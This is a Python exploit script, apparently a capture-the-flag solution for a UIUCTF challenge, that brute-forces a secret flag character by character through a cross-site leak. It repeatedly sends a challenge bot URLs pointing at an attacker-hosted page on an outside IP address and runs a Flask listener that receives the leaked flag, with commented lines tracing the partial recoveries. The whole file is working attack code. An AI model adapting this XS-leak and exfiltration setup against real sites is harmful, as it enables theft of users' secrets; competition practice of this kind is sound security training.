# exploit.py
from pwn import *
from time import sleep
from flask import *
from sys import exit
from threading import * 

app = Flask(__name__)

bot_url = "yana-bot.chal.uiuc.tf"
bot_port = 1337

condition = True
#FLAG = b"uiuctf{"
#FLAG = b"uiuctf{y"
#FLAG = b"uiuctf{y0"
# (...)
#FLAG = b"uiuctf{y0u_m4y_w4nt_2_d3let3_y0ur_gh_p4g3s_s1t3_or_r1sk_0thers_d01ng_4_crtsh_lo"
#FLAG = b"uiuctf{y0u_m4y_w4nt_2_d3let3_y0ur_gh_p4g3s_s1t3_or_r1sk_0thers_d01ng_4_crtsh_lo0"
#FLAG = b"uiuctf{y0u_m4y_w4nt_2_d3let3_y0ur_gh_p4g3s_s1t3_or_r1sk_0thers_d01ng_4_crtsh_lo0k"
#FLAG = b"uiuctf{y0u_m4y_w4nt_2_d3let3_y0ur_gh_p4g3s_s1t3_or_r1sk_0thers_d01ng_4_crtsh_lo0ku"
FLAG = b"uiuctf{y0u_m4y_w4nt_2_d3let3_y0ur_gh_p4g3s_s1t3_or_r1sk_0thers_d01ng_4_crtsh_lo0kup"

poc_url = b"http://141.164.52.207/xsleak/exploit.html?a="
char_list = list('abcdefghijklmnopqrstuvwxyz1234567890}{_')

@app.route('/flag')
def index():
    global FLAG, condition
    FLAG = request.args.get('flag')
    condition = False
    log.info("Success!")
    log.info(f'The flag is : {FLAG}')

    return "Success"

def send_bot():
    global condition
    for char in char_list:
        if condition:
            bot = remote(bot_url, bot_port, level='error' )
            url = poc_url + FLAG + char.encode('utf-8')

            #log.info(f'Send url : {url}')
            sleep(1)
            bot.sendlineafter(b'Please send me a URL to open.\n', url)
        else:
            exit(0)

def run_flask():
    app.run(host="0.0.0.0", port=9999)

if __name__ == '__main__':
    t1 = Thread(target=run_flask)
    t2 = Thread(target=send_bot)

    t1.start()
    t2.start()